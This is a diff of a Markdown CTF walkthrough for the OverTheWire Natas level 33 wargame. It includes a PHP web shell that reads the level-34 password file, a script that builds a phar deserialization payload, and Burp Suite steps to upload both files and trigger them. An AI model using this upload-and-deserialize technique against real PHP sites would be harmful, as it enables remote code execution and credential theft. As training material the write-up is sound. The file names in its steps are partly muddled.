@@ -1768,49 +1768,76 @@ Step 3: Then click view source code, it's a php script
 
 ![image](./images-1/image-33-1.png)
 
-Step 4: we need create files, 1.natas33.php, 2.shell.php, 
+Step 4: we need create file, 1.natas33.php 
 
 Step 5: So, we will Write a code like this, In nano editor, Then save the file, Then . Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
 
+    <?php 
+    echo shell_exec('cat /etc/natas_webpass/natas34');
+    ?>
 
+Step 6: we need create file, 2.shell.php, 
 
-<?php 
-echo shell_exec('cat /etc/natas_webpass/natas34');
-?>
+    <?php
+    class Executor
+    {
+       private $filename = "shell.php";
+       private $signature = True;
+       private $init = False;
+    }
+     $phar = new Phar('natas.phar');
+     $phar->startBuffering();
+     $phar->addFromstring('test.txt', 'test');
+     $phar->setStub('<?php __HALT_COMPILER(); ?>');
 
+    $object = new Executor();
+    $object ->data = 'rips';
+    $phar ->setMetadata($object);
+    $phar->stopBuffering();
 
+    ?>
 
+Step 7: Then Run this commnand, After this it automatically creates natas.phar file
 
+    php -d phar.readonly=false natas33.php
 
+![image](./images-1/image-33-2.png)
 
+Step 8: We want to see contents of the  natas.phar file , it will look like this
 
+![image](./images-1/image-33-3.png)
 
+Step 9: Then switch on the intercept on (Receive)
 
+Step 10: First set up firefox proxy on Burp suite, Browse a shell.php file, then upload it, It will navigate to burpsuite, Then click send to Repeater, Then click on Repeater, it has placed in menus bar
 
-<?php
-class Executor
-{
-    private $filename = "shell.php";
-    private $signature = True;
-    private $init = False;
-}
-$phar = new Phar('natas.phar');
-$phar->startBuffering();
-$phar->addFromstring('test.txt', 'test');
-$phar->setStub('<?php __HALT_COMPILER(); ?>');
+![image](./images-1/image-33-4.png)
 
-$object = new Executor();
-$object ->data = 'rips';
-$phar ->setMetadata($object);
-$phar->stopBuffering();
+Step 11: Then changes that propertiy to shell.php, Then click send button
 
-?>
+![image](./images-1/image-33-5.png)
 
+![image](./images-1/image-33-6.png)
 
+Step 12: Disable browser burpsuite proxy, Then again Browse a natas.phar file, then upload it, Then click send  Repeater, Then click on Repeater,
 
+![image](./images-1/image-33-7.png)
 
+Step 13: Then changes that propertiy to natas.phar, Then click send button
 
+![image](./images-1/image-33-8.png)
 
+![image](./images-1/image-33-9.png)
+
+Step 14: Go to http history, Then click what you click previously natas.phar file, Then click send  Repeater, Then click on Repeater
+
+![image](./images-1/image-33-10.png)
+
+Step 15: Then changes that propertiy to phar://natas.phar/test.txt, Then click send button
+
+Step 16: Then you will see the password for level-34
+
+![image](./images-1/image-33-11.png)
 
 
 ## Level-34
